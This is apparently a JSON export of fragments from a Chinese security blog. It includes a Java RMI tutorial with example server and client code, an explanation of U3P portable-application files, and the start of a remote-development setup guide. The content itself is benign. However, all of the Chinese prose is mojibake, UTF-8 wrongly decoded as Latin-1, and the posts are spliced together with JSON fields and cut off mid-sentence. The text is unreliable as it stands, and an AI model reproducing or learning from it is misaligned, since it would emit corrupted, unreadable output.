å¦‚æœ2æˆç«‹ï¼Œæ˜¯ç”±äºè¯¥å¯¹è±¡ç‰¹æ®Šï¼Ÿæ˜¯å› ä¸ºä»–æ³¨å†Œäº†?ï¼ˆè®¾ç½®äº†å¯ä»¥å¯¹å¤–ï¼‰ 2å’Œ3çš„è§£ç­”\næ—¢ç„¶ Client ç«¯æœ‰ä¸€ä¸ª Stub å¯ä»¥æ„é€ ä¿¡æ¯å—å‘é€ç»™ Server ç«¯ï¼Œé‚£ä¹ˆ Server ç«¯å¿…å®šä¼šæœ‰ä¸€ä¸ªæ¥æ”¶è¿™ä¸ªä¿¡æ¯å¿«çš„å¯¹è±¡ï¼Œç§°ä¸º Skeleton\nå®ƒä¸»è¦çš„å·¥ä½œæ˜¯ï¼š\nè§£æä¿¡æ¯å¿«ä¸­çš„è°ƒç”¨å¯¹è±¡æ ‡è¯†ç¬¦å’Œæ–¹æ³•æè¿°ï¼Œåœ¨ Server ç«¯è°ƒç”¨å…·ä½“çš„å¯¹è±¡æ–¹æ³•ã€‚ å–å¾—è°ƒç”¨çš„è¿”å›å€¼æˆ–è€…å¼‚å¸¸å€¼ã€‚ æŠŠè¿”å›å€¼è¿›è¡Œç¼–ç»„ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ Stub. è¿™é‡Œå¯ä»¥äº†è§£åˆ°çš„ä¸œè¥¿\nServerç«¯æœ‰ä¸€ä¸ªæ¥å—ä¿¡æ¯å—çš„ä¸œè¥¿ç§°ä¹‹ä¸º Skeleton Skeleton ä¹Ÿå¯èƒ½æ˜¯ä½œä¸ºServerç«¯çš„ä»£ç†ï¼Œå¯¹Serveréšè—å®ç°ç»†èŠ‚ Skeleton è·å¾—ä¿¡æ¯å—åï¼Œå–å‡ºå€¼äº¤ç»™Serverç«¯ï¼Œå¹¶ä»Serverç«¯è·å¾—ç»“æœï¼ˆå¯èƒ½æ˜¯è¿”å›å€¼ï¼Œå¼‚å¸¸å€¼ï¼‰ Skeleton å¯¹ç›¸å…³ç»“æœè¿›è¡Œ ç¼–ç  å‘é€å›Clientç«¯ æ‰€ä»¥ï¼ŒRMIçš„æ•´ä¸ªå·¥ä½œæµç¨‹å³ä¸º\nRMIå·¥ä½œæµç¨‹ é¦–å…ˆï¼ŒæœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡å¹¶å°†å…¶æ³¨å†Œåˆ°æ³¨å†Œè¡¨ä¸­ï¼ˆæ³¨å†Œè¡¨ä¸­å†™å…¥Stubï¼‰ å®¢æˆ·ç«¯å¯ä»¥è·å–æ³¨å†Œè¡¨ä¸­å­˜å‚¨çš„å¯¹è±¡çš„å¼•ç”¨ï¼ˆStubï¼‰ å½“å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šä¼šåœ¨ä¸å®¢æˆ·ç«¯ JVM åœ¨åŒä¸€ JVM ä¸­çš„å­˜æ ¹å¯¹è±¡ï¼ˆStubï¼‰ä¸Šè°ƒç”¨è¯¥æ–¹æ³•ã€‚ å­˜æ ¹å¯¹è±¡ï¼ˆStubï¼‰ä¼šåˆ›å»ºä¸€æ¡æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«æ–¹æ³•çš„åç§°ä»¥åŠå…¶å‚æ•°ï¼ˆç§°ä¸ºå°è£…ï¼‰ï¼Œå¹¶å°†æ­¤æ¶ˆæ¯å‘é€åˆ°ä½äºæœåŠ¡å™¨ JVM ä¸­çš„ç›¸å…³éª¨æ¶å¯¹è±¡ï¼ˆSkeletonï¼‰ã€‚ éª¨æ¶å¯¹è±¡ï¼ˆSkeletonï¼‰ä¼šä»æ¶ˆæ¯ä¸­æå–æ–¹æ³•åå’Œå‚æ•°ï¼ˆç§°ä¸ºè§£å°è£…ï¼‰ï¼Œå¹¶è°ƒç”¨ä¸å…¶å…³è”çš„è¿œç¨‹å¯¹è±¡ä¸Šçš„é€‚å½“æ–¹æ³•ã€‚ è¿œç¨‹å¯¹è±¡æ‰§è¡Œè¯¥æ–¹æ³•å¹¶å°†è¿”å›å€¼ä¼ å›éª¨æ¶å¯¹è±¡ï¼ˆSkeletonï¼‰ã€‚ éª¨æ¶å¯¹è±¡ï¼ˆSkeletonï¼‰å†å°†è¿”å›å€¼å°è£…åœ¨æ¶ˆæ¯ä¸­å¹¶å°†æ­¤æ¶ˆæ¯å‘é€åˆ°å­˜æ ¹å¯¹è±¡ï¼ˆStubï¼‰ã€‚ å­˜æ ¹å¯¹è±¡ï¼ˆStubï¼‰ä»æ¶ˆæ¯ä¸­è§£å°è£…è¿”å›å€¼ï¼Œå¹¶å°†è¯¥å€¼è¿”å›ç»™å®¢æˆ·ç«¯ç¨‹åº çœ‹åˆ°è¿™é‡Œæœ‰è¯»è€…æˆ–è®¸ä¼šæœ‰ç–‘æƒ‘ï¼šStubä¸æ˜¯åœ¨Clientç«¯çš„å—ï¼Œä¸ºä»€ä¹ˆå’ŒæœåŠ¡å™¨æ²¾è¾¹äº†ï¼Ÿ\nStubæ˜¯Clientä½¿ç”¨ï¼Œä½†æ˜¯æ˜¯ç”±Serverç«¯åˆ›å»ºçš„ï¼ŒClient åœ¨ç¬¬ä¸€æ¬¡å°è¯•è¿œç¨‹è°ƒç”¨å‰éœ€è¦é€šè¿‡ç½‘ç»œåœ¨æ³¨å†Œè¡¨ä¸­å–å‡ºStubï¼Œä¹‹åçš„å†æ¬¡ä½¿ç”¨å°±å¯ä»¥ä¸å†é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´æ¥ä½¿ç”¨æœ¬åœ°å·²ç»è·å–çš„Stubå³å¯\næ³¨æ„ï¼šè§£ç­”ä¸­çš„Stubå¯å¤ç”¨çš„å‰ææ˜¯Clientç«¯åªéœ€è¦è¿œç¨‹è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœéœ€è¦è°ƒç”¨å¤šä¸ªä¸åŒç±»å¯¹è±¡çš„è¯ï¼Œæ¯ä¸ªç±»å¯¹è±¡åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å‰éœ€è¦è·å¾—Stub\nç›¸å…³æœ¯è¯­æ€»ç»“\nRMIRegistry RMIæ³¨å†Œè¡¨ï¼ŒRMIServerè´Ÿè´£å°†stubsï¼ˆå­˜æ ¹ï¼‰æ³¨å†Œåˆ°RMIRegistryï¼ŒRMIClientä»RMIRegistryè·å–stubsï¼ˆå­˜æ ¹ï¼‰ã€‚ RMIServer RMIServerè´Ÿè´£åˆ›å»ºRemote Objectï¼ˆè¿œç¨‹å¯¹è±¡ï¼‰ï¼Œå¹¶å°†ä¹‹å¯¼å‡ºåˆ° JAVA RMI runtimeï¼Œè¿œç¨‹å¯¹è±¡å¿…é¡»è¢«å¯¼å‡ºåˆ°JAVA RMI runtimeï¼Œè¿™æ ·è¯¥è¿œç¨‹å¯¹è±¡æ‰èƒ½æ¥å—è¿œç¨‹è°ƒç”¨ã€‚ RMIClient RMIClientè´Ÿè´£å‘èµ·è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚ Remote Object RMIServerè´Ÿè´£åˆ›å»ºRemote Objectï¼ˆè¿œç¨‹å¯¹è±¡ï¼‰ï¼Œå¹¶å°†ä¹‹å¯¼å‡ºåˆ° JAVA RMI runtimeã€‚ stubsï¼ˆå­˜æ ¹ï¼‰ JAVA RMIä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„ç±»ï¼ˆè¿™äº›ç±»è¢«ç§°ä½œstubsï¼‰æ¥å‘èµ·å¯¹è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨ã€‚è¿œç¨‹å¯¹è±¡å¯¼å‡ºçš„ç»“æœå½¢æˆäº†è¿™ç§ç‰¹æ®Šçš„ç±»ï¼ˆstubsï¼‰ã€‚stubsä¸Remote Objectå®ç°çš„æ¥å£æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”åŒ…å«hostnameå’Œportï¼Œhostnameå’Œportä¸Remote Objectèƒ½å¤Ÿå½¢æˆå¯¹åº”å…³ç³»ã€‚stubså®ä¾‹å®é™…ä¸Šå°±æ˜¯Remote Objectï¼ˆè¿œç¨‹å¯¹è±¡ï¼‰ RMIä»£ç å®ç° å‡è®¾éœ€æ±‚ï¼šClient ç«¯éœ€è¦æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œç”¨æˆ·ä¿¡æ¯å­˜åœ¨äº Server ç«¯ï¼Œæ‰€ä»¥åœ¨ Server ç«¯å¼€æ”¾äº† RMI åè®®æ¥å£ä¾›å®¢æˆ·ç«¯è°ƒç”¨æŸ¥è¯¢ï¼Œè¿”å›æ˜¯ä¸€ä¸ªå¯¹è±¡\næ‰€ä»¥Clientè°ƒç”¨å‰éœ€è¦ï¼š\nServerå¼€æ”¾RMIåè®®æ¥å£ RMI Server Server ç«¯ä¸»è¦æ˜¯æ„å»ºä¸€ä¸ªå¯ä»¥è¢«ä¼ è¾“çš„ç±» Userï¼Œä¸€ä¸ªå¯ä»¥è¢«è¿œç¨‹è®¿é—®çš„ç±» UserServiceï¼ŒåŒæ—¶è¿™ä¸ªå¯¹è±¡è¦æ³¨å†Œåˆ° RMI å¼€æ”¾ç»™å®¢æˆ·ç«¯ä½¿ç”¨ã€‚\né¦–å…ˆUserç±»éœ€è¦è¢«ä¼ è¾“ï¼Œæ‰€ä»¥éœ€è¦ç»§æ‰¿ Serializableï¼Œä½¿å¾—å¯¹è±¡å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œåºåˆ—åŒ–åçš„å¯¹è±¡æ‰èƒ½ä¼ è¾“ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package com.wdbyte.rmi.server; import java.io.Serializable; public class User implements Serializable { private static final long serialVersionUID = 6490921832856589236L; private String name; private Integer age; private String skill; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public String getSkill() { return skill; } public void setSkill(String skill) { this.skill = skill; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, skill=\u0026#39;\u0026#34; + skill + \u0026#39;\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } Userç±»åªæ˜¯ä½œä¸ºå¯ä»¥ä¼ è¾“æ•°æ®çš„å­˜åœ¨ï¼Œéœ€è¦ä¸€ä¸ªç±»æ¥è¿›è¡Œè¿œç¨‹é€šä¿¡ï¼Œé€šä¿¡ä¼ è¾“çš„æ˜¯Userç±»çš„å®ä¾‹åŒ–å¯¹è±¡\næ‰€ä»¥è®¾è®¡ä¸€ä¸ªUserServiceç±»\nä½†è¿™ç§ç±»ä¸æ˜¯éšæ„å®ç°çš„ï¼Œè¿™ç§ç±»çš„å…·ä½“å®ç°å®˜æ–¹ç»™äº†ç›¸å…³è§„èŒƒï¼š\néœ€è¦å…ˆè®¾ç½®ä¸€ä¸ªæ¥å£ï¼Œå†æœ‰ä¸€ä¸ªç±»å®ç°è¿™ä¸ªæ¥å£\næ‰€ä»¥éœ€è¦å…ˆè®¾è®¡æ¥å£\næ‰€ä»¥æœ‰\nUserService æ¥å£ å®˜æ–¹å¯¹æ­¤ç±»æ¥å£çš„è§„å®šï¼šéœ€è¦ç»§æ‰¿ Remote ç±»ï¼Œæ–¹æ³•éœ€è¦æŠ›å‡º RemoteException\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.wdbyte.rmi.server; import java.rmi.Remote; import java.rmi.RemoteException; public interface UserService extends Remote { /** * æŸ¥æ‰¾ç”¨æˆ· * * @param userId * @return * @throws RemoteException */ User findUser(String userId) throws RemoteException; } å…¶æ¬¡éœ€è¦è®¾è®¡ä¸€ä¸ªå®ç°äº†æ¥å£çš„ç±»\nUserServiceImpl æ¥å£å®ç°ç±» å®˜æ–¹å¯¹å®ç°ç±»çš„è§„å®šï¼šéœ€è¦ç»§æ‰¿ UnicastRemoteObject ç±»ï¼Œä¸”éœ€è¦å®ç°åˆšæ‰å®šä¹‰çš„æ¥å£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package com.wdbyte.rmi.server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class UserServiceImpl extends UnicastRemoteObject implements UserService { protected UserServiceImpl() throws RemoteException { } @Override public User findUser(String userId) throws RemoteException { // åŠ è½½åœ¨æŸ¥è¯¢ if (\u0026#34;00001\u0026#34;.equals(userId)) { User user = new User(); user.setName(\u0026#34;é‡‘åº¸\u0026#34;); user.setAge(100); user.setSkill(\u0026#34;å†™ä½œ\u0026#34;); return user; } throw new RemoteException(\u0026#34;æŸ¥æ— æ­¤äºº\u0026#34;); } } æœ€åæ˜¯è¿›è¡Œé€šä¿¡çš„ä¸»ç¨‹åºçš„è®¾è®¡ æŒ‡å®šå¯¹è±¡ä½œä¸ºè¿œç¨‹è®¿é—®å¯¹è±¡ï¼ˆä¹Ÿå«æ³¨å†Œï¼‰ï¼Œè®¾ç½®ç›¸å…³å‚æ•°ï¼ˆæ¯”å¦‚è®¾ç½®è®¿é—®ç«¯å£ï¼‰\næœåŠ¡ç«¯ç»‘å®š UserService å¯¹è±¡ä½œä¸ºè¿œç¨‹è®¿é—®çš„å¯¹è±¡ï¼Œå¯åŠ¨æ—¶ç«¯å£è®¾ç½®ä¸º 1900\nè§£ç­”ï¼šä»£ç ä¸­è®¾ç½®äº†å…·ä½“å¯¹è±¡urlå’Œå¯¹åº”ç»‘å®šç«¯å£çš„ï¼Œæ‰€ä»¥æŒ‡å®šURLè·¯å¾„å’Œç«¯å£ï¼Œå¯ä»¥ç†è§£ä¸ºå”¯ä¸€å¯¹è±¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.wdbyte.rmi.server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RmiServer { public static void main(String[] args) { try { UserService userService = new UserServiceImpl(); LocateRegistry.createRegistry(1900); Naming.rebind(\u0026#34;rmi://0.0.0.0:1900/user\u0026#34;, userService); System.out.println(\u0026#34;start server,port is 1900\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } æ–°ç–‘é—®ï¼š\nè¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ç»‘å®š UserServiceImpl å¯¹è±¡è€Œæ˜¯ UserService\nLocateRegistry.createRegistry(1900);è¿™é‡Œçš„1900éœ€è¦å’ŒNaming.rebind(\u0026quot;rmi://localhost:1900/user\u0026quot;, userService);ä¸­çš„1900å¯¹åº”å—\nï¼ˆæ˜¯çš„ï¼Œè¯¦è§è¿™é‡Œï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯å¯åŠ¨RMI Registryï¼Œç¬¬äºŒæ­¥ç»‘å®šçš„æ—¶å€™éœ€è¦å¯»æ‰¾åˆ°RMI Registryï¼‰\næ•´ä¸ªServerç«¯çš„è®¾è®¡æ˜¯ï¼š\nä¸»ç¨‹åºä½¿ç”¨è®¾è®¡å¥½çš„é€šä¿¡ç±» é€šä¿¡ç±»ä½¿ç”¨è®¾è®¡å¥½çš„å¯åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œä¼ è¾“ ä¹‹åæ˜¯Clientç«¯\nRMI Client Client ç«¯ç®€å•çš„å¤šã€‚ç›´æ¥å¼•å…¥å¯è¿œç¨‹è®¿é—®å’Œéœ€è¦ä¼ è¾“çš„ç±»ï¼Œé€šè¿‡ç«¯å£å’Œ Server ç«¯ç»‘å®šçš„åœ°å€ï¼Œå°±å¯ä»¥å‘èµ·ä¸€æ¬¡è°ƒç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package com.wdbyte.rmi.client; import java.rmi.Naming; import com.wdbyte.rmi.server.User; import com.wdbyte.rmi.server.UserService; public class RmiClient { public static void main(String args[]) { User answer; String userId = \u0026#34;00001\u0026#34;; try { // lookup method to find reference of remote object UserService access = (UserService)Naming.lookup(\u0026#34;rmi://localhost:1900/user\u0026#34;); answer = access.findUser(userId); System.out.println(\u0026#34;query:\u0026#34; + userId); System.out.println(\u0026#34;result:\u0026#34; + answer); } catch (Exception ae) { System.out.println(ae); } } } ç–‘é—®ï¼š\nClientæ­¤å¤„çš„Userç±»å’ŒUserServiceæ¥å£å¦‚ä½•ç¡®ä¿å’Œè¿œç«¯çš„Userç±»ç›¸åŒï¼Ÿï¼ˆå¯é€‰æ–¹æ¡ˆï¼šæå‰å•†è®®ï¼Œæˆ–è€…é»˜è®¤ä¿¡ä»»ï¼‰ è¿è¡Œæµ‹è¯• è¿è¡ŒRmiServer.javaå’ŒRmiClient.java\nServer\nClient\nClient æŸ¥è¯¢ä¸å­˜åœ¨ï¼ˆä¿®æ”¹userIDå˜é‡ï¼‰\nè¡¥å…… è§£ç­”ï¼Œè§è¡¥å……1\nRmiRegistry æ˜¯éœ€è¦å¯åŠ¨çš„ï¼Œå¦‚æœæ²¡æœ‰æ³¨å†Œè¡¨ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯æ— æ³•å­˜å…¥Stub RmiRegistry å¯ä»¥å•ç‹¬ä½¿ç”¨å‘½ä»¤å¯åŠ¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä»£ç å¯åŠ¨\n1 2 Windows C:\\Users\\love1\u0026gt;start rmiregistry 2001 1 2 Linux $ rmiregistry -J-D=java.rmi.server.codebase=/home/d4n 2001 1 2 3 //javaä»£ç  LocateRegistry.createRegistry(2001); //Registryä½¿ç”¨2001ç«¯å£ï¼Œé»˜è®¤å¯åŠ¨ç«¯å£1099 è·å– RmiRegistry ä¸­çš„å®ä¾‹å¯¹è±¡ï¼ˆStubï¼‰ 1 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 20001); //è·å–Registry ä½†æ˜¯ä¸Šä¸ªä¾‹å­ä¸­ä½¿ç”¨çš„æ˜¯Naming.lookupï¼ŒNaming.lookupåªæ˜¯å°è£…äº†ç›¸å…³æŸ¥è¯¢ï¼Œæ‰€ä»¥åº•å±‚è¿˜æ˜¯LocateRegistry.getRegistry\nRMI çš„å¦ä¸€ä¸ªä¾‹å­ RMI Server\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.vulhub.RMI; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } //å¤šäº†ä¸€æ­¥çˆ¶ç±»çš„åˆå§‹åŒ–ï¼Œä»£ç é€»è¾‘ä¸å˜ public String hello() throws RemoteException { System.out.println(\u0026#34;call from\u0026#34;); return \u0026#34;Hello world\u0026#34;; } } private void start() throws Exception { RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind(\u0026#34;rmi://0.0.0.0:1099/Hello\u0026#34;, h); //å¦‚æœRMI Registryåœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£ä¹ˆhostå’Œportæ˜¯å¯ä»¥çœç•¥çš„ï¼Œæ­¤æ—¶hosté»˜è®¤æ˜¯ localhost ï¼Œporté»˜è®¤æ˜¯ 1099 ï¼š //Naming.bind(\u0026#34;Hello\u0026#34;, new RemoteHelloWorld()); å³å¯ } public static void main(String[] args) throws Exception { new RMIServer().start(); } } RMI Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.vulhub.Train; import org.vulhub.RMI.RMIServer; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class TrainMain { public static void main(String[] args) throws Exception { RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming .lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); String ret = hello.hello(); System.out.println(ret); } } è¿™ä¸ªä¾‹å­çš„æ¯è¡Œä»£ç éƒ½å¾ˆæ¸…æ™°çš„è¯ï¼Œè¯´æ˜å·²ç»ç†è§£RMIçš„ä»£ç å®ç°äº†\nRMIé€šä¿¡æµé‡ æ­¤å›¾ä¸ºå¤§ä½¬çš„RMIé€šä¿¡çº¯å‡€çš„æµé‡æˆªå›¾ï¼Œå…¶ä¸­ 135.1 ä¸ºClient 135.142 ä¸ºServer\nå¯ä»¥çœ‹åˆ°æ•´ä¸ªé€šä¿¡æ˜¯æœ‰ä¸¤æ¬¡TCPè¿æ¥çš„ï¼š\nç¬¬ä¸€æ¬¡æ˜¯Clientè¿æ¥ Server çš„1099ç«¯å£ ç¬¬äºŒæ¬¡æ˜¯Client è¿æ¥ Server çš„ 33769 ç«¯å£ ç¬¬äºŒæ¬¡çš„ç«¯å£å·å­˜åœ¨äºç¬¬ä¸€æ¬¡çš„ReturnDataä¸­ã€‚\næœ€åè¿œç¨‹çš„æ–¹æ³•æ‰§è¡Œæ˜¯åœ¨RMI Serverä¸­æ‰§è¡Œï¼Œç¬¬äºŒä¸ªä¾‹å­ä¸­çš„System.out.println(\u0026quot;call from\u0026quot;);å³å¯è¯æ˜\nè§£å†³ç–‘é—® 1.Clientè®¿é—®é™æ€ç±»æ–¹æ³•ï¼Ÿ\n","date":"2024-04-08T17:29:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240409172707180.png","permalink":"https://d4n-sec.github.io/p/rmi-study/","title":"Rmi Study"},{"content":"ä»€ä¹ˆæ˜¯u3pæ–‡ä»¶ .u3p æ–‡ä»¶æ˜¯å­˜å‚¨åœ¨U3æ™ºèƒ½é©±åŠ¨å™¨ï¼ˆä¸€ç§ç‰¹æ®Šç±»å‹çš„USBé—ªå­˜é©±åŠ¨å™¨ï¼ŒåŒ…æ‹¬U3 Launchpadå¹³å°ï¼‰ä¸Šçš„ä¾¿æºå¼åº”ç”¨ç¨‹åºã€‚å®ƒåŒ…å«ç¨‹åºå¯æ‰§è¡Œæ–‡ä»¶å’Œé…ç½®æ•°æ®ã€‚å¦‚æœéœ€è¦åœ¨è®¡ç®—æœºä¸Šè¿è¡ŒæŸäº›æ–‡ä»¶ï¼Œè¯·åœ¨è®¡ç®—æœºä¸Šè¿è¡Œä¸€äº›æ–‡ä»¶ã€‚\n1 A U3P file is a portable application stored on a U3 Smart Drive, a special type of USB flash drive that includes the U3 Launchpad platform. It contains program executables and configuration data. U3P files enable a program to be run from the flash drive on any Windows computer and may install some files on the local computer if needed. å…¶ä¸­æåŠçš„ U3 Smart Drive ï¼ˆU3æ™ºèƒ½é©±åŠ¨å™¨ï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„Uç›˜ï¼Œç›¸å…³åˆ›å»ºæˆ–è€…æ¨åŠ¨ç»„ç»‡è¯•å›¾å»ºç«‹ä¸€ä¸ªæ–°æ ‡å‡†çš„è½¯ç¡¬ä»¶å¼€å‘å¹³å°ï¼Œä½†ç›¸å…³æŠ€æœ¯å·²ç»åœ¨2009å¹´å¹´åº•å¼€å§‹é€æ­¥æ·˜æ±°å¹¶åœæ­¢U3æŠ€æœ¯æ”¯æŒã€‚\nè¯¦ç»†è¯´æ˜ .U3P æ–‡ä»¶ä»¥å‹ç¼©.ZIP æ ¼å¼ä¿å­˜ã€‚å®ƒä»¬å¯èƒ½åŒ…å«å››ä¸ªç›®å½•ï¼šdata\\ã€device\\ã€host\\ã€manifest\\ã€‚ä¸»æœº\\ç›®å½•åŒ…å«.EXE æ–‡ä»¶ã€‚manifest\\ç›®å½•ä¿å­˜åº”ç”¨ç¨‹åºé…ç½®ä¿¡æ¯ï¼ˆ.U3I æ–‡ä»¶ï¼‰å’Œç¨‹åºå›¾æ ‡ã€‚\nå¦‚ä¸‹å®ä¾‹ä¸ºwiresharkçš„u3på®‰è£…åŒ…\nä¿®æ”¹åç¼€ä¸ºzipåç›´æ¥è§£å‹ç¼©å³å¯\n1 é€šå¸¸æƒ…å†µä¸‹ï¼Œç”±SanDiskã€Verbatimã€Kingstonã€Memorexå’ŒIntuixç­‰åˆ¶é€ å•†å°†U3 Launchpadå®‰è£…åˆ°U3æ™ºèƒ½é©±åŠ¨å™¨ä¸Šã€‚ä½†æ˜¯ï¼Œè¦æ‰‹åŠ¨å®‰è£….U3P å¯åŠ¨æ¿ï¼Œè¯·ä¸‹è½½å¹¶è¿è¡ŒU3 Launchpadå®‰è£…ç¨‹åºï¼Œè¯¥å®‰è£…ç¨‹åºå¯ä»SanDiskå…è´¹è·å¾—ã€‚å¯ä»¥ä½¿ç”¨SanDiskçš„Launchpadç§»é™¤å·¥å…·ä»USBé—ªå­˜é©±åŠ¨å™¨ä¸­åˆ é™¤U3 Launchpadç¨‹åºã€‚ å½“USBé—ªå­˜é©±åŠ¨å™¨æ’å…¥è®¡ç®—æœºçš„USBç«¯å£æ—¶ï¼ŒU3å¯åŠ¨æ¿ç¨‹åºè¿è¡Œã€‚.U3P ç¨‹åºå¯ä»ç±»ä¼¼äºWindowsâ€œå¼€å§‹â€èœå•çš„ç”¨æˆ·ç•Œé¢ä¸­ä½¿ç”¨ã€‚\næ³¨æ„ï¼šSanDisk U3 Launchpadå·²åœæ­¢ä½¿ç”¨ï¼Œä¸å†è¿›è¡Œç»´æŠ¤ã€‚\n","date":"2024-04-07T11:03:04+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240407111740164.png","permalink":"https://d4n-sec.github.io/p/about_u3p/","title":"About_u3p"},{"content":"å‰è¨€ ç¬”è€…ç›®å‰æœ‰ä¸¤ä¸ªç”µè„‘ï¼Œä¸€ä¸ªAåœ¨å®¶ï¼ˆé«˜æ€§èƒ½ï¼‰ï¼Œä¸€ä¸ªBåœ¨å…¬å¸ï¼ˆè¾ƒä½æ€§èƒ½ï¼‰ï¼Œå¦‚ä½•åŒæ­¥ä¸¤ä¸ªç”µè„‘çš„ç¯å¢ƒä¸€ç›´æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œè¾ƒä½æ€§èƒ½çš„ç¬”è®°æœ¬å†™æ–‡æ¡£å®Œå…¨æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœæ¶‰åŠä¸€äº›å·¥å…·ç¼–è¯‘ï¼Œå¤šå°è™šæ‹ŸæœºåŒæ—¶ä½¿ç”¨ï¼Œä¸å¯ã€‚ä¸Šä¼ githubéœ€è¦pushï¼Œä½†æ˜¯ç¬”è€…å¹¶æ²¡æœ‰è‰¯å¥½çš„pushä¹ æƒ¯ã€‚ç›¸åï¼Œåªéœ€è¦gitä½œä¸ºå­˜å‚¨å•å…ƒçš„ç¬”è€…æ·±å—å…¶gitç‰ˆæœ¬æ§åˆ¶çš„å›°æ‰°ï¼Œgitæ–¹æ¡ˆå¤±è´¥ï¼Œæœ‰å‘æ—¥è‘µè¿™æ ·çš„è¿œæ§è½¯ä»¶ä½†æ˜¯è¿œæ§åœ¨å…è´¹ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸èƒ½åšåˆ°åˆäºŒä¸ºä¸€çš„æ„Ÿå—ï¼ˆå»¶è¿Ÿï¼‰\nè§£å†³æ–¹æ¡ˆ ç›®å‰ä½¿ç”¨é«˜æ€§èƒ½åœ¨å®¶ç”µè„‘ä½œä¸ºæœåŠ¡ç«¯ï¼Œç¬”è®°æœ¬ä½œä¸ºå®¢æˆ·ç«¯ï¼Œæ‰€æœ‰ä»£ç ä½äºåœ¨å®¶ç”µè„‘ build and runï¼Œå®¢æˆ·ç«¯åªéœ€è¦è”ç½‘+vscodeå³å¯å®ç°æ‰€æœ‰é¡¹ç›®å…±äº«\nå·¥å…· 1.è’²å…¬è‹±ï¼ˆå†…ç½‘æ­å»ºå·¥å…·ï¼‰\næ–¹ä¾¿ï¼Œå…è´¹ã€‚ä¸ªäººå…è´¹é¢åº¦ä¸ºä¸‰å°ç”µè„‘ç»„æˆä¸€ä¸ªå†…ç½‘ï¼Œä¸ªäººç”¨æˆ·å®Œå…¨è¶³å¤Ÿ\n2.ssh\nvscodeè¿œç¨‹è¿æ¥éœ€è¦ä½¿ç”¨\n3.å®¢æˆ·æœºï¼ˆBï¼‰å®‰è£… vscode\nå®‰è£… æå‰å®‰è£…å‘æ—¥è‘µä½œä¸ºè¾…åŠ©è½¯ä»¶ï¼Œåœ¨è¿œç¨‹å®‰è£…å‰æœŸå’Œåç»­å‡ºç°é—®é¢˜æ—¶ï¼Œå‘æ—¥è‘µä¼šæ›´åŠ æœ‰åº”æ€¥ä½œç”¨\nè’²å…¬è‹±æ­£å¸¸å®‰è£…å³å¯ï¼Œä¸¤å°ç”µè„‘åŒæ—¶ç™»å½•åŒä¸€è´¦å·ï¼Œå³å¯å®Œæˆç»„ç½‘ã€‚ æµ‹è¯•ï¼šè¿œç«¯ä¸æœ¬åœ°ç«¯å‡å…³é—­é˜²ç«å¢™åäº’pingï¼ˆIPåœ°å€å¯ä»¥åœ¨è’²å…¬è‹±è½¯ä»¶ä¸ŠæŸ¥çœ‹ï¼‰ï¼Œäº’é€šå³äº’è¿\nssh windows 